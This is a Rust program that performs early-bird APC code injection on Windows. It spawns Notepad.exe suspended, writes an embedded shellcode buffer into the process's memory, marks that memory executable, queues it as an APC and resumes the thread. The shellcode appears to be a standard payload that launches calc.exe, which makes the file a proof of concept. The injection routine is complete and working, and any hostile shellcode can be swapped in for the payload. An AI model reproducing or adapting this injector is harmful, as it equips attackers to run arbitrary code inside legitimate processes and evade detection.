use std::{
    ffi::CString,
    intrinsics::copy_nonoverlapping,
    mem::{transmute, zeroed},
    os::windows::thread,
    ptr::null_mut,
};

use winapi::{
    ctypes::c_void,
    shared::minwindef::FALSE,
    um::{
        debugapi::DebugActiveProcessStop, errhandlingapi::GetLastError, handleapi::CloseHandle, memoryapi::{VirtualAllocEx, VirtualProtectEx, WriteProcessMemory}, processthreadsapi::{
            CreateProcessA, PROCESS_INFORMATION, QueueUserAPC, ResumeThread, STARTUPINFOA,
        }, synchapi::WaitForSingleObject, winbase::{CREATE_SUSPENDED, DEBUG_PROCESS}, winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE, PAGE_READWRITE}
    },
};

const BUF: &[u8] = &[
    0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51,
    0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52,
    0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
    0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0xe2, 0xed,
    0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x8b, 0x80, 0x88,
    0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44,
    0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48,
    0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1,
    0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44,
    0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49,
    0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a,
    0x41, 0x58, 0x41, 0x59, 0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41,
    0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x48, 0xba, 0x01, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d, 0x01, 0x01, 0x00, 0x00, 0x41, 0xba, 0x31, 0x8b,
    0x6f, 0x87, 0xff, 0xd5, 0xbb, 0xe0, 0x1d, 0x2a, 0x0a, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff,
    0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb, 0x47,
    0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c, 0x63, 0x2e,
    0x65, 0x78, 0x65, 0x00,
];

fn create_suspended_proces(
    process_name: &str,
    pid: &mut u32,
    process_handle: &mut *mut c_void,
    thread_handle: &mut *mut c_void,
) -> bool {
    unsafe {
        let mut si = zeroed::<STARTUPINFOA>();
        let mut pi = zeroed::<PROCESS_INFORMATION>();

        si.cb = size_of::<STARTUPINFOA>() as u32;

        //C:\\Windows\\System32\\{process_name} to the process name
        let process_name =
            CString::new(format!("C:\\Windows\\System32\\{}", process_name)).unwrap();

        if CreateProcessA(
            null_mut(),
            process_name.as_ptr() as *mut i8,
            null_mut(),
            null_mut(),
            FALSE,
            // DEBUG_PROCESS,
            CREATE_SUSPENDED,
            null_mut(),
            null_mut(),
            &mut si,
            &mut pi,
        ) == 0
        {
            println!("[-] CreateProcessA failed with error: {}", GetLastError());
            return false;
        }

        *pid = pi.dwProcessId;
        *process_handle = pi.hProcess as *mut c_void;
        *thread_handle = pi.hThread as *mut c_void;

        if *process_handle != null_mut() && *thread_handle != null_mut() && *pid > 0 {
            return true;
        }
    }

    return false;
}

fn apc_inject(
    process_handle: *mut c_void,
    thread_handle: *mut c_void,
    shellcode: &[u8],
    shellcode_size: usize,
) -> bool {
    unsafe {
        let paddress = VirtualAllocEx(
            process_handle,
            null_mut(),
            shellcode_size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );
        if paddress.is_null() {
            println!("[-] VirtualAllocEx faield with error: {}", GetLastError());
            return false;
        }

        println!("[+] Memory allocated at {:x?}", paddress);

        let mut bytes_written = 0;

        if WriteProcessMemory(
            process_handle,
            paddress,
            shellcode.as_ptr() as *mut c_void,
            shellcode_size,
            &mut bytes_written,
        ) == 0
        {
            println!(
                "[-] WriteProcessMemory failed with error: {}",
                GetLastError()
            );
            return false;
        }

        let mut old_protect = 0;

        if VirtualProtectEx(
            process_handle,
            paddress,
            shellcode_size,
            PAGE_EXECUTE_READWRITE,
            &mut old_protect,
        ) == 0
        {
            println!("[-] VirtualProtectEx failed with error: {}", GetLastError());
            return false;
        }

        if QueueUserAPC(Some(transmute(paddress)), thread_handle, 0) == 0 {
            println!("[-] QueueUserAPC failed with error: {}", GetLastError());
            return false;
        };
    }

    return true;
}

fn pause() {
    println!("Press Enter to continue...");
    let mut input = String::new();
    std::io::stdin().read_line(&mut input).unwrap();
}
fn main() {
    let process_name = "Notepad.exe";
    let mut pid: u32 = 0;
    let mut process_handle: *mut c_void = null_mut();
    let mut thread_handle: *mut c_void = null_mut();

    if create_suspended_proces(
        process_name,
        &mut pid,
        &mut process_handle,
        &mut thread_handle,
    ) {
        println!(
            "[+] Created Process {} successfully with PID: {}",
            process_name, pid
        );
    } else {
        println!("[-] Failed to create process.");
    }

    if apc_inject(process_handle, thread_handle, &BUF, BUF.len()) {
        println!("[+] APC Injection successfull.");
    } else {
        println!("[-] APC injection failed");
    }

    unsafe {
        ResumeThread(thread_handle);
/*  
        use ResumeThread if CREATE_SUSPENDED flag is used in CreateProcessA
        use DebugActiveProcessStop if DEBUG_PROCESS flag is used in CreateProcessA
*/
        // DebugActiveProcessStop(pid);


        CloseHandle(thread_handle);
        CloseHandle(process_handle);
    }
    pause();
}
